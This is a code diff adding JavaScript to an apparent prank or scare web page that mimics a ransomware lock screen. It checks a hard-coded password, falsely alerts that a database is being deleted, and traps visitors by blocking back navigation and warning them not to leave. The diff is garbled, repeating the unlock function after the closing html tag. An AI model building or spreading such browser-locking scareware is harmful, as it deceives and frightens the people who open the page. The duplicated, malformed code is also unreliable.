@@ -51,6 +51,23 @@
             history.pushState(null, null, location.href);
             window.onpopstate = () => history.go(1);
         }
+        function unlock() {
+            if (document.getElementById('pass').value === "unzzganteng") {
+                document.getElementById('sound').pause();
+                document.body.innerHTML = "<h1 style='color:#0f0; text-align:center;'>DECRYPTION SUCCESS!</h1>";
+                if (document.exitFullscreen) document.exitFullscreen().catch(() => {});
+            } else {
+                alert("KODE SALAH! MENGHAPUS DATABASE...");
+            }
+        }
+
+        // Script Jebakan Tambahan: Mencegah Back di Browser
+        window.onbeforeunload = function() {
+            return "DATA SEDANG DIKUNCI! JANGAN KELUAR!";
+        };
+    </script>
+</body>
+</html>
 
         function unlock() {
             if (document.getElementById('pass').value === "unzzganteng") {
